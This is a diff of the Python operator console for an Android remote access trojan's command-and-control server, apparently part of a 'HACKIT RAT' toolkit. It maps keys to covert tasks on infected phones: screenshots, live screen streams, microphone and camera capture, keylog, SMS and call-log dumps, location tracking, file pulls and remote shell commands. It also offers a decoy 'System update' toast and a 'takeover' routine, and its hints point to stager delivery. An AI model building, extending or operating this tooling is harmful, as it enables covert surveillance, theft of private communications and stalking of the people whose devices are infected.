@@ -1,23 +1,24 @@
 """Live operator UI: a full-screen terminal that fills itself from the C2.
 
-Sessions on the left, events and keystrokes on the right, location and task
-state underneath, one command line at the bottom. The listener runs on its own
-thread, so the screen never blocks a beacon and a slow disk never freezes the
-feed. If stdout is not a TTY it degrades to a plain line feed.
+Devices on the left, events on the right, keystrokes and session state below,
+one command line at the bottom. Every pane is built at a fixed width and joined
+side by side, so a long label truncates inside its column instead of wrapping
+over the next one. The listener runs on its own thread, so the screen never
+blocks a beacon and a slow disk never freezes the feed. Without a TTY it
+degrades to one rendered block per input line.
 """
 from __future__ import annotations
 
 import asyncio
+import json
 import os
-import shutil
 import threading
 import time
-import json
 from typing import Dict, List, Optional
 
 from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_RED, B_WHITE, B_YELLOW, DIM, GREEN
 
-from . import protocol, store
+from . import protocol, server, store, term
 from .server import Hub, make_app
 
 KIND_COLOR = {
@@ -33,17 +34,20 @@ KIND_COLOR = {
     "info": DIM,
     "native": DIM,
     "register": GREEN,
+    "takeover": B_MAGENTA,
     "shell": B_RED,
 }
 
 HELP = [
-    ("session", "1-9 select · j/k next/prev · Space refresh · Enter open detail"),
-    ("capture", "s screenshot · m mic 15s · c camera · v live screen stream"),
-    ("intel", "i info · l locate · g keylog · a apps · u usage · w wifi"),
-    ("files", "f <dir> list · p <path> pull"),
-    ("control", "x <cmd> shell · t <ms> toast · b buzz"),
-    ("misc", "r refresh · h help · q quit (Ctrl-C also)"),
+    ("devices", "1-9 pick · j / k move · Enter inspect"),
+    ("capture", "s screenshot · v stream on/off · m mic 15s · c photo"),
+    ("intel", "i info · l fix · g keylog · a apps · u usage · w wifi · p perms"),
+    ("files", "f <dir> list · P <path> pull"),
+    ("control", "x <cmd> shell · t <msg> toast · b buzz · T re-takeover"),
+    ("session", "r refresh · h help · q quit (Ctrl-C also)"),
 ]
+
+FOOTER = "1-9 pick · s shot · m mic · c cam · g keylog · x shell · T takeover · h help · q quit"
 
 
 class LiveUI:
@@ -62,7 +66,7 @@ class LiveUI:
         self.message = ""
         self.started = time.time()
         self.width = 100
-        self.height = 30
+        self.height = 32
         self.helping = False
         self.last_frame: Optional[str] = None
         self.flash: Optional[str] = None
@@ -107,15 +111,15 @@ class LiveUI:
         for event in store.events(sid, after_id=last, limit=40):
             self.seen_events[sid] = event["id"]
             stamp = time.strftime("%H:%M:%S", time.localtime(event["ts"]))
-            self.feed.append((stamp, event["kind"], _compact(event["body"], 220)))
-        del self.feed[:-60]
+            self.feed.append((stamp, event["kind"], term.trunc(_summarize(event["kind"], event["body"]), 160)))
+        del self.feed[:-80]
         for task in store.tasks(sid, 12):
             state = task["state"]
             if self.tasks.get(task["id"]) != state and state != "queued":
                 self.tasks[task["id"]] = state
                 if task.get("output"):
                     self.feed.append((time.strftime("%H:%M:%S"), "out:" + task["cmd"],
-                                      _compact(task["output"], 200)))
+                                      term.trunc(str(task["output"]), 160)))
         for row in store.keylogs(sid, 0, 200)[-40:]:
             line = f"[{row['package']}] {row['text']}"
             if line not in self.keys:
@@ -125,10 +129,10 @@ class LiveUI:
     def queue(self, cmd: str, args: Optional[List[str]] = None) -> None:
         session = self.current()
         if not session:
-            self.message = "no session"
+            self.message = "no device selected"
             return
         if not protocol.allowed(cmd, _spec_modules(session)):
-            self.message = f"{cmd} not in spec '{session.get('spec', 'rat')}'"
+            self.message = f"{cmd} is not in spec '{session.get('spec', 'rat')}'"
             return
         try:
             task_id = store.queue_task(session["sid"], cmd, args or [])
@@ -138,116 +142,136 @@ class LiveUI:
         self.hub.wake(session["sid"])
         self.message = f"queued #{task_id} {cmd}"
 
-    # ------------------------------------------------------------- render
-    def _box(self, title: str, rows: List[str], width: int, color: str, rows_needed: int) -> List[str]:
-        head = f" {title} "
-        top = _colored("┌" + head.ljust(width - 2, "─") + "┐", color)
-        out = [top]
-        for i in range(rows_needed):
-            body = rows[i] if i < len(rows) else ""
-            out.append(_colored("│ ", color) + _pad(body, width - 4) + _colored(" │", color))
-        out.append(_colored("└" + "─" * (width - 2) + "┘", color))
-        return out
-
-    def render(self) -> str:
-        size = shutil.get_terminal_size((110, 32))
-        self.width = max(80, min(size.columns, 200))
-        self.height = max(24, min(size.lines, 50))
-        width = self.height and self.width
+    def takeover(self) -> None:
         session = self.current()
+        if not session:
+            self.message = "no device selected"
+            return
+        sid = session["sid"]
+        store.release_takeover(sid)
+        queued = server.auto_takeover(self.hub, sid)
+        self.hub.wake(sid)
+        self.message = f"takeover re-queued ({queued} steps)"
 
+    # ------------------------------------------------------------- render
+    def _header(self) -> List[str]:
         uptime = int(time.time() - self.started)
         online = sum(1 for s in self.sessions if s["online"])
-        head_l = _colored(" ● HACKIT RAT ", B_RED) + _colored(self.hub.public_url, B_CYAN)
-        head_r = (f"up {uptime//60}m{uptime%60:02d}s   "
-                  f"{_colored(str(online), GREEN if online else DIM)}/{len(self.sessions)} online   "
-                  f"{len(self.feed)} events")
-        header = _pad(head_l, self.width - _visible_len(head_r) - 2) + _colored(head_r, DIM)
-        lines = [header, _colored("═" * self.width, DIM)]
-        _ = width
+        left = term.Bad + " ● HACKIT · RAT " + term.RESET + term.Dim + term.trunc(
+            self.hub.public_url, max(10, self.width // 2 - 12)) + term.RESET
+        right = (f"up {uptime // 60:02d}:{uptime % 60:02d}  "
+                 f"{_colored(str(online), GREEN if online else DIM)}/{len(self.sessions)} online  "
+                 f"{len(self.feed)} ev")
+        return [term.pad(left, max(0, self.width - term.vislen(right))) + term.Dim + right + term.RESET,
+                term.rule(self.width, "═", term.Frame)]
 
+    def _devices(self, width: int, height: int) -> List[str]:
+        rows: List[str] = []
+        if not self.sessions:
+            rows = [
+                term.Dim + "waiting for the first beacon…" + term.RESET,
+                term.Dim + "build: make app" + term.RESET,
+                term.Dim + "deliver: inject / make stager" + term.RESET,
+            ]
+        label_w = max(6, width - 14)
+        for i, row in enumerate(self.sessions[:9]):
+            mark = term.Good + "▸" + term.RESET if i == self.index else " "
+            dot = term.Good + "●" + term.RESET if row["online"] else term.Dim + "○" + term.RESET
+            spec = (row.get("spec") or "rat")[:7]
+            rows.append(f"{mark}{dot} {term.Accent}{term.pad(spec, 7)}{term.RESET}"
+                        f" {term.trunc(row['label'], label_w)}")
+            batt = int(row.get("battery") or 0)
+            model = (row.get("model") or "?")[:16]
+            bar = "█" * max(1, batt // 14) if batt else "▏"
+            rows.append(f"   {term.Dim}{term.trunc(model, 14)} {bar} {batt}%"
+                        f"{'⚡' if row.get('charging') else ''}{term.RESET}")
+        return term.box("DEVICES", rows, width, term.Frame, height)
+
+    def _feed(self, width: int, height: int) -> List[str]:
+        rows: List[str] = []
+        room = max(8, width - 17)
+        if not self.feed:
+            rows.append(term.Dim + "waiting for events…" + term.RESET)
+        for stamp, kind, body in self.feed[-(height - 2):]:
+            color = KIND_COLOR.get(kind, DIM)
+            label = kind[:7] if not kind.startswith("out:") else "out"
+            rows.append(f"{term.Dim}{stamp}{term.RESET} {color}{term.pad(label, 7)}{term.RESET}"
+                        f" {term.trunc(body, room)}")
+        return term.box("LIVE FEED", rows, width, term.Ink, height)
+
+    def _keys(self, width: int, height: int) -> List[str]:
+        session = self.current()
+        title = f"KEYSTROKES · {session['label'][:12]}" if session else "KEYSTROKES"
+        rows: List[str] = []
+        if not self.keys:
+            rows.append(term.Dim + "nothing captured yet" + term.RESET)
+        for line in self.keys[-(height - 2):]:
+            rows.append(term.trunc(line, width - 4))
+        return term.box(title, rows, width, term.Accent, height)
+
+    def _status(self, width: int, height: int) -> List[str]:
+        session = self.current()
+        rows: List[str] = []
+        if not session:
+            rows.append(term.Dim + "select a device with 1-9" + term.RESET)
+        else:
+            loc = store.locations(session["sid"], 1)
+            tasks = store.tasks(session["sid"], 4)
+            rows.append(f"{term.Dim}sid{term.RESET} {term.trunc(session['sid'], width - 6)}")
+            rows.append(f"{term.Dim}ip {term.RESET} {session.get('pub_ip') or '-'}"
+                        f"  {term.Dim}sdk{term.RESET} {session.get('sdk') or '?'}")
+            if loc:
+                rows.append(f"{term.Dim}fix{term.RESET} {loc[0]['lat']:.4f}, {loc[0]['lon']:.4f}"
+                            f" ±{int(loc[0]['accuracy'] or 0)}m")
+            else:
+                rows.append(f"{term.Dim}fix{term.RESET} —")
+            if tasks:
+                rows.append(" ".join(f"{t['cmd']}:{t['state'][:4]}" for t in tasks))
+            if self.last_frame:
+                rows.append(f"{term.Dim}screen{term.RESET} {term.trunc(self.last_frame, width - 10)}")
+        return term.box("STATUS", rows, width, term.Frame, height)
+
+    def render(self) -> str:
+        self.width, self.height = term.size()
+        lines = self._header()
+        bottom = self.height >= 26
+        body_h = max(6, self.height - (13 if bottom else 4))
         if self.helping:
-            help_rows: List[str] = []
+            rows: List[str] = []
             for group, text in HELP:
-                help_rows.append(_colored(group.ljust(9), B_CYAN) + " " + text)
-            lines += self._box("HELP — any verb also works as a raw command (e.g. sms_dump 50)",
-                                help_rows, self.width, B_CYAN, len(help_rows) + 1)
-            lines.append(_colored("  press any key to return", DIM))
+                rows.append(term.Accent + term.pad(group, 9) + term.RESET + " " + text)
+            lines += term.box("HELP — raw commands also work (e.g. sms_dump 50)", rows,
+                              self.width, term.Frame, len(rows) + 1)
+            lines.append(term.Dim + "  any key returns" + term.RESET)
             return "\n".join(lines)
 
-        left_w = min(34, self.width // 3)
-        right_w = self.width - left_w - 4
-        session = self.current()
-
-        # left: devices
-        srows: List[str] = []
-        if not self.sessions:
-            srows.append(_colored("waiting for the first beacon…", DIM))
-            srows.append(_colored("build: make app", DIM))
-            srows.append(_colored("deliver: inject / make stager", DIM))
-        for i, row in enumerate(self.sessions[:10]):
-            mark = _colored("▸", B_GREEN) if i == self.index else _colored(" ", DIM)
-            dot = _colored("●", GREEN) if row["online"] else _colored("○", DIM)
-            spec = (row.get("spec") or "rat")[:7]
-            srows.append(f"{mark}{dot} {_colored(spec, B_MAGENTA)} {row['label'][:16]}")
-            batt = int(row.get("battery") or 0)
-            model = (row.get("model") or "?")[:20]
-            bar = "█" * max(1, batt // 14) if batt else "▏"
-            srows.append(f"   {_colored(model, DIM)} {bar} {batt}%{'+⚡' if row.get('charging') else ''}")
-        lines += self._box("DEVICES", srows, left_w, B_CYAN, self.height - 9)
-
-        # middle: live feed
-        feed_rows: List[str] = []
-        if not self.feed:
-            feed_rows.append(_colored("waiting for events…", DIM))
-        for stamp, kind, body in self.feed[-(self.height - 13):]:
-            color = KIND_COLOR.get(kind, DIM)
-            feed_rows.append(f"{_colored(stamp, DIM)} {_colored(kind[:6].ljust(6), color)} {_clip(_summarize(kind, body), right_w - 16)}")
-        lines += self._box("LIVE FEED", feed_rows, right_w, B_WHITE, self.height - 13)
-
-        lines.append(_colored("─" * self.width, DIM))
-
-        # bottom: keystrokes + status
-        if session:
-            keys_title = f"KEYSTROKES · {session['label'][:12]}"
+        if self.width >= 104:
+            left = min(34, max(24, self.width // 4))
+            right = self.width - left - 1
+            lines += term.horizontal(
+                self._devices(left, body_h),
+                self._feed(right, body_h),
+            )
         else:
-            keys_title = "KEYSTROKES"
-        key_rows: List[str] = []
-        if not self.keys:
-            key_rows.append(_colored("no keystrokes captured yet", DIM))
-        for line in self.keys[-6:]:
-            key_rows.append(_clip(line, self.width // 2 - 4))
-        lines += self._box(keys_title, key_rows, self.width // 2, B_MAGENTA, 8)
+            top = max(6, body_h // 3)
+            lines += self._devices(self.width, top)
+            lines += self._feed(self.width, body_h - top)
 
-        stat_rows: List[str] = []
-        if session:
-            loc = store.locations(session["sid"], 1)
-            tasks = store.tasks(session["sid"], 5)
-            stat_rows.append(f"{_colored('sid', DIM)} {session['sid'][:18]}  "
-                             f"{_colored('ip', DIM)} {session.get('pub_ip') or '-'}  "
-                             f"{_colored('sdk', DIM)} {session.get('sdk')}")
-            if loc:
-                stat_rows.append(f"{_colored('fix', DIM)} {loc[0]['lat']:.4f}, {loc[0]['lon']:.4f} "
-                                 f"±{int(loc[0]['accuracy'] or 0)}m {loc[0]['provider']}")
-            else:
-                stat_rows.append(f"{_colored('fix', DIM)} —")
-            if tasks:
-                stat_rows.append(" ".join(f"{_colored(t['cmd'], B_WHITE)}:{t['state'][:4]}" for t in tasks))
-            if self.last_frame:
-                stat_rows.append(f"{_colored('screen', DIM)} {_clip(self.last_frame, self.width // 2 - 20)}")
-        else:
-            stat_rows.append(_colored("select a device with 1-9 to see status", DIM))
-        lines += self._box("STATUS", stat_rows, self.width - self.width // 2 - 2, B_CYAN, 8)
-
-        # footer
+        lines.append(term.rule(self.width, "─", term.Dim))
+        if bottom:
+            half = self.width // 2
+            lines += term.horizontal(
+                self._keys(half, 7),
+                self._status(self.width - half - 1, 7),
+            )
         if self.flash:
-            lines.append(_colored(" ► " + self.flash, B_YELLOW))
+            lines.append(term.Warn + " ► " + term.trunc(self.flash, self.width - 3) + term.RESET)
             self.flash = None
         elif self.message:
-            lines.append(_colored(" ► " + self.message, B_YELLOW))
+            lines.append(term.Warn + " ► " + term.trunc(self.message, self.width - 3) + term.RESET)
             self.message = ""
         else:
-            lines.append(_colored(" ► ", DIM) + _colored("h help · q quit", DIM))
+            lines.append(term.Dim + " ► " + term.trunc(FOOTER, self.width - 3) + term.RESET)
         return "\n".join(lines)
 
     # -------------------------------------------------------------- input
@@ -256,62 +280,70 @@ class LiveUI:
         if not parts:
             self.refresh()
             return True
-        verb = parts[0].lower()
+        verb = parts[0]
+        key = verb if len(verb) == 1 else verb.lower()
         args = parts[1:]
-        if verb in ("q", "quit", "exit"):
+        if key in ("q", "quit", "exit"):
             return False
-        if verb in ("help", "?", "h"):
-            self.helping = True
+        if key in ("h", "?", "help"):
+            self.helping = not self.helping if key == "h" else True
             return True
-        if verb in ("j", "k") or verb.isdigit():
-            if verb == "j":
-                self.index = min(self.index + 1, len(self.sessions) - 1)
-            elif verb == "k":
+        if key in ("j", "k") or (len(key) == 1 and key.isdigit()):
+            if key == "j":
+                self.index = min(self.index + 1, max(0, len(self.sessions) - 1))
+            elif key == "k":
                 self.index = max(self.index - 1, 0)
             else:
-                self.index = max(0, min(int(verb) - 1, len(self.sessions) - 1))
+                self.index = max(0, min(int(key) - 1, max(0, len(self.sessions) - 1)))
             self.refresh()
             return True
-        if verb == "h" or verb == "help" or verb == "?":
-            self.helping = not self.helping
+        if key == "r":
+            self.refresh()
             return True
-        if verb == "s":
+        if key == "T":
+            self.takeover()
+            return True
+        if key == "s":
             self.queue("screenshot")
-        elif verb == "m":
-            self.queue("mic_rec", ["15"])
-        elif verb == "c":
-            self.queue("cam_shot")
-        elif verb == "i":
-            self.queue("info")
-        elif verb == "l":
-            self.queue("loc")
-        elif verb == "g":
-            self.queue("keylog_dump")
-        elif verb == "a":
-            self.queue("apps")
-        elif verb == "f":
-            self.queue("files_ls", [" ".join(args) or "."])
-        elif verb == "p":
-            self.queue("files_pull", [" ".join(args)])
-        elif verb == "x":
-            self.queue("shell", [" ".join(args)])
-        elif verb == "u":
-            self.queue("usage", ["7"])
-        elif verb == "w":
-            self.queue("wifi_dump")
-        elif verb == "t":
-            self.queue("toast", [" ".join(args) or "System update"])
-        elif verb == "b":
-            self.queue("vibrate", ["600"])
-        elif verb == "v":
-            self.queue("screen_start")
+        elif key == "v":
             session = self.current()
-            if session:
-                self.last_frame = f"{self.hub.public_url}/v1/live/{session['sid']}"
-        elif verb == "r":
-            self.refresh()
+            if session and self.last_frame:
+                self.last_frame = None
+                self.queue("screen_stop")
+            else:
+                self.queue("screen_start")
+                if session:
+                    self.last_frame = f"{self.hub.public_url}/v1/live/{session['sid']}"
+        elif key == "m":
+            self.queue("mic_rec", ["15"])
+        elif key == "c":
+            self.queue("cam_shot")
+        elif key == "i":
+            self.queue("info")
+        elif key == "p":
+            self.queue("perm_status")
+        elif key == "l":
+            self.queue("loc")
+        elif key == "g":
+            self.queue("keylog_dump")
+        elif key == "a":
+            self.queue("apps")
+        elif key == "u":
+            self.queue("usage", ["7"])
+        elif key == "w":
+            self.queue("wifi_dump")
+        elif key == "f":
+            self.queue("files_ls", [" ".join(args) or "."])
+        elif key == "P":
+            self.queue("files_pull", [" ".join(args)])
+        elif key == "x":
+            self.queue("shell", [" ".join(args)])
+        elif key == "t":
+            self.queue("toast", [" ".join(args) or "System update"])
+        elif key == "b":
+            self.queue("vibrate", ["600"])
         else:
-            self.queue(verb, args)
+            self.queue(verb.lower(), args)
         return True
 
     def run(self) -> None:
@@ -361,35 +393,11 @@ class LiveUI:
                     if char == "\x1b":
                         continue
                     buffer = (buffer + char)[:120]
-                os.write(1, f"\x1b[{self.height + 4};1H\x1b[2K rat> {buffer}".encode())
+                os.write(1, f"\x1b[{self.height - 1};1H\x1b[2K rat> {buffer}".encode())
         except KeyboardInterrupt:
             pass
         finally:
             termios.tcsetattr(fd, termios.TCSADRAIN, saved)
-
-
-def _clip(text: str, width: int) -> str:
-    text = str(text).replace("\n", " ")
-    return text if len(text) <= width else text[: max(0, width - 1)] + "…"
-
-
-def _pad(text: str, width: int) -> str:
-    return text + " " * max(0, width - _visible_len(text))
-
-
-def _visible_len(text: str) -> int:
-    total = 0
-    index = 0
-    while index < len(text):
-        if text[index] == "\x1b":
-            index += 2
-            while index < len(text) and not text[index].isalpha():
-                index += 1
-            index += 1
-            continue
-        total += 1
-        index += 1
-    return total
 
 
 def _summarize(kind: str, body: str) -> str:
@@ -397,43 +405,35 @@ def _summarize(kind: str, body: str) -> str:
     try:
         data = json.loads(body)
     except Exception:
-        return _compact(body, 300)
+        return term.trunc(body, 300)
     if kind == "sms" and isinstance(data, list):
-        out = []
-        for row in data[:2]:
-            out.append(f"{row.get('from','?')}: {row.get('body','')}")
-        return " | ".join(out)
+        return " | ".join(f"{row.get('from', '?')}: {row.get('body', '')}" for row in data[:2])
     if kind == "call" and isinstance(data, list):
-        out = []
-        for row in data[:2]:
-            out.append(f"{row.get('number','?')} ({row.get('name','') or 'unknown'}) {row.get('duration',0)}s")
-        return " | ".join(out)
+        return " | ".join(f"{row.get('number', '?')} ({row.get('name', '') or 'unknown'}) "
+                          f"{row.get('duration', 0)}s" for row in data[:2])
     if kind == "loc" and isinstance(data, list) and data:
         row = data[0]
-        return f"{row.get('lat')},{row.get('lon')} ±{row.get('acc','?')} {row.get('src','')}"
+        return f"{row.get('lat')},{row.get('lon')} ±{row.get('acc', '?')} {row.get('src', '')}"
     if kind == "keylog" and isinstance(data, list):
-        return " ".join(str(r.get("text","")) for r in data[:3] if isinstance(r, dict))
+        return " ".join(str(r.get("text", "")) for r in data[:3] if isinstance(r, dict))
     if kind == "notif" and isinstance(data, dict):
-        return f"{data.get('pkg','')}: {data.get('title','')} {data.get('text','')}".strip()
+        return f"{data.get('pkg', '')}: {data.get('title', '')} {data.get('text', '')}".strip()
     if kind == "clip":
         text = data.get("text") if isinstance(data, dict) else data
         return str(text)[:200]
+    if kind == "takeover":
+        return f"takeover ran · {data.get('steps') if isinstance(data, dict) else '?'} steps"
     if isinstance(data, dict):
         for key in ("name", "path", "pkg", "cmd"):
             if key in data:
                 return str(data[key])
-    return _compact(body, 300)
+    return term.trunc(body, 300)
 
 
 def _spec_modules(session: dict) -> Optional[List[str]]:
-    spec = session.get("spec") or "rat"
     from . import builder
+    spec = session.get("spec") or "rat"
     return sorted(set(builder.CORE_MODULES + builder.SPECS.get(spec, [])))
-
-
-def _compact(body: str, limit: int) -> str:
-    text = body if len(body) <= limit else body[:limit] + "…"
-    return text.replace("\n", " ")
 
 
 def run(host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) -> None:
